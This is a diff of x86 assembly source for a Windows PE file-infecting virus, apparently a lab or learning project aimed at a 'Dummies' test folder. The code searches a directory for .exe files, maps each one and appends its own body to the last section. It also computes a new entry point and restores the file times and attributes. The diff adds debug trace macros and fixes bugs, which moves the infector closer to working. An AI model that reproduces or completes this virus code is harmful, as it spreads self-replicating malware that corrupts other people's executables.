@@ -1,15 +1,36 @@
+%include "io.inc"
 
-;%include "io.inc"
+%macro PRINT_FILE 0 
+    pushad
+    mov dword[counter], 1
+    NEWLINE
+    PRINT_STRING [search + 44]
+    NEWLINE
+    popad
+%endmacro
 
-NULL         equ 0
-virusLen	   equ	(end - start)
+%macro PRINT_TRACE 0 
+    pushad
+    PRINT_DEC    4, [counter]
+    PRINT_STRING ": "
+    PRINT_HEX    4, esp
+    PRINT_STRING "  "
+    PRINT_HEX    4, eax
+    NEWLINE
+    inc dword[counter]
+    popad
+%endmacro
+
+NULL equ                0
+virusLen equ	           end - start
+kernelAddress equ       0
 
 GetLastError equ        (6B815F70h - 6B800000h)
 GetStdHandle equ        (6B81DA70h - 6B800000h)
-WriteFile    equ        (6B829D30h - 6B800000h)
-ExitProcess  equ        (6B82ADB0h - 6B800000h)
+WriteFile equ           (6B829D30h - 6B800000h)
+ExitProcess equ         (6B82ADB0h - 6B800000h)
 SetCurrentDirectory equ (6B838720h - 6B800000h)
-CreateFileA  equ        (6B8298B0h - 6B800000h)
+CreateFileA equ         (6B8298B0h - 6B800000h)
 FindFirstFileA equ      (6B829960h - 6B800000h)
 FindNextFileA equ       (6B8299D0h - 6B800000h)
 GetFileAttributesA equ  (6B829A90h - 6B800000h)
@@ -24,11 +45,10 @@ UnmapViewOfFile equ     (6B81CEC0h - 6B800000h)
 SetFilePointer equ      (6B829CD0h - 6B800000h)
 SetEndOfFile equ        (6B829C90h - 6B800000h)
 
-kernelAddress equ 0
-
 global _main
 
 section .data
+    counter             dd 1
     directory           db "C:\Assembly\Dummies\", 0
     exestr              db "*.exe", 0
     search times 592    db 41h
@@ -47,7 +67,6 @@ section .data
     oldEntryPoint       dd 0
     newEntryPoint       dd 0
     imageBase           dd 0
-    
     oldRawSize          dd 0
     newRawSize          dd 0
     incRawSize          dd 0
@@ -57,9 +76,6 @@ section .text
 start:
 _main:
     mov ebp, esp; for correct debugging
-    
-    push    ebp         ; prolog
-    mov     ebp, esp    ; makes a fixed base pointer to refrence stack variables through    
   
     ; aloocate variables on the stack
     ;sub esp, 592        ; aloocate FIND_DATA structure
@@ -88,13 +104,12 @@ _main:
     ;   sub     eax, 700
     lea     ebx, [search]
     push    ebx                ; Push the address of the search record
-    mov     ebx, exestr	        ; Point to file mask
-    push    ebx                 ; Push the address of file mask
+    mov     ebx, exestr        ; Point to file mask
+    push    ebx                ; Push the address of file mask
     mov     ebx, FindFirstFileA                 ; call
     add     ebx, [ebp - kernelAddress]
     call    ebx 
-        ;PRINT_STRING [search + 44]
-        ;NEWLINE
+    PRINT_FILE
     cmp     eax, -1
     mov     edi, eax        ; edi will store the file handle
     jz      done
@@ -111,11 +126,11 @@ again:
     call    ebx        
     cmp     eax, 0
     jz      done
-        ;PRINT_STRING [search + 44]
-        ;NEWLINE
+    PRINT_FILE
     mov     esi, [search + 44]
     mov     ecx, [search + 32]
     call	  InfectFile
+    PRINT_TRACE
     jmp     again
      
            
@@ -164,7 +179,7 @@ InfectFile:
 ;;    - esi = filename                               ;;
 ;;    - ecx = filesize                               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    PUSHAD								; Save all registers
+    pushad								; Save all registers
  
     mov	  [newFileSize], ecx          ; Save file size
     mov     ebx, 0
@@ -172,7 +187,7 @@ InfectFile:
     add	  ecx, virusLen               ; ECX = victim filesize + virus
     add	  ecx, 1000h						; ECX = victim filesize + virus + 1000h
     mov     [memoryToMap], ecx          ; Memory to map
-
+    PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; save the original attributes                      ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -299,6 +314,7 @@ OkGo:
     mov	  ebx, [esi + 3ch]                ; EBX = PE Header
     cmp	  word [esi + ebx], 0x4550 ;'EP'  ; Is it a PE file ?
     jne	  UnmapView                       ; Error ?
+    PRINT_TRACE
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; If the file is not EXE, is already infected or is ;;
@@ -313,6 +329,7 @@ OkGo:
     mov	  [imageBase], eax            ; Save the Image Base
     mov	  eax, [esi + 3ch]			
     mov	  dword [fileAlign], eax	; Save File Alignment ; (EAX = File Alignment)
+    PRINT_TRACE
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Locate the last section in the PE                 ;;
@@ -368,6 +385,7 @@ OkGo:
     mov     ecx, [fileAlign]				; ECX = File alignment
     sub     ecx, edx						; Number of bytes to pad
     mov     [esi + 10h], ecx				; Save it
+    PRINT_TRACE
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now size of raw data = number of bytes to pad     ;;
@@ -394,6 +412,7 @@ OkGo:
     add     eax, [esi + 16d]				; Add VirtualSize, Rawsize
     sub     eax, virusLen					; Subtract the size of virus
     mov     [newEntryPoint], eax			; EAX = new EIP, and save it
+    PRINT_TRACE
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Here we compute with how much did we increase     ;;
@@ -403,6 +422,7 @@ OkGo:
     mov     ebx, [newRawSize]				; New SizeOfRawdata
     sub     ebx, eax						; Increase in size
     mov     [incRawSize], ebx				; Save increase value
+    PRINT_TRACE
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Compute the new file size                         ;;
@@ -424,6 +444,7 @@ OkGo:
     lea     esi, [start]                ; Location to copy the virus from
     mov     ecx, virusLen					; Number of bytes to copy
     rep     movsb							; Copy all the bytes
+    PRINT_TRACE
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now, lets alter furthur the PE header by marking  ;;
@@ -440,6 +461,7 @@ OkGo:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     esi, [mapAddress]
     ;mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
+    PRINT_TRACE
  
 UnmapView:
     mov	  ebx, [mapAddress]
@@ -447,12 +469,15 @@ UnmapView:
     mov     ecx, UnmapViewOfFile
     add     ecx, [ebp - kernelAddress]
     call    ecx
+    PRINT_TRACE
     
 CloseMap:
     mov     ebx, [mapHandle]
+    push    ebx
     mov     ebx, CloseHandle
     add     ebx, [ebp - kernelAddress]
     call    ebx 
+    PRINT_TRACE
     
 CloseFile:
     lea	  ebx, [fileTimesSave]
@@ -466,13 +491,14 @@ CloseFile:
     mov     ebx, SetFileTime
     add     ebx, [ebp - kernelAddress]
     call    ebx 
+    PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; In order to properly close the file we must set   ;;
 ;; its EOF at the exact end of file, So first we     ;;
 ;; move the pointer to the end and set the EOF       ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     push    0							; First we must set the file
-    push    0							; Pointer at the end of file (that is the beginning + new file size)
+    push    NULL						; Pointer at the end of file (that is the beginning + new file size)
     mov     ebx, [newFileSize]
     push    ebx
     mov     ebx, [fileHandle]
@@ -480,175 +506,59 @@ CloseFile:
     mov     ebx, SetFilePointer
     add     ebx, [ebp - kernelAddress]
     call    ebx 
+    PRINT_TRACE
  
     mov     ebx, [fileHandle]
     push    ebx
     mov     ebx, SetEndOfFile
     add     ebx, [ebp - kernelAddress]
     call    ebx 
+    PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; And finaly we close the file                      ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, CloseFile
+    mov     ebx, CloseHandle
     add     ebx, [ebp - kernelAddress]
     call    ebx 
+    PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Then we must restore file attributes              ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     ebx, [fileAttributes]
     push    ebx
-    mov     ebx, [fileOffset]
-    push    ebx
+    lea     ebx, [search + 44]
+    push    ebx                ; Push the address of the search record
     mov     ebx, SetFileAttributesA
     add     ebx, [ebp - kernelAddress]
+    PRINT_TRACE
     call    ebx 
-    jmp     InfectionSuccesful
+    PRINT_TRACE
+    
+    ;mov     ebx, GetLastError
+    ;add     ebx, [ebp - kernelAddress]
+    ;PRINT_TRACE
+    ;call    ebx 
+
+    jmp     InfectionSuccessful
     
 InfectionError:
     stc
     jmp     OutOfHere
     
-InfectionSuccesful:
+InfectionSuccessful:
+    PRINT_TRACE
+    mov eax, 15
     cmp     word[infectionFlag], 0FFh
     je      InfectionError
     clc	
     
 OutOfHere:
+    PRINT_TRACE
     popad								; Restore all registers
+    PRINT_TRACE
+    
     retn
-    
-    
-    
-
-
-
 
 end:
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
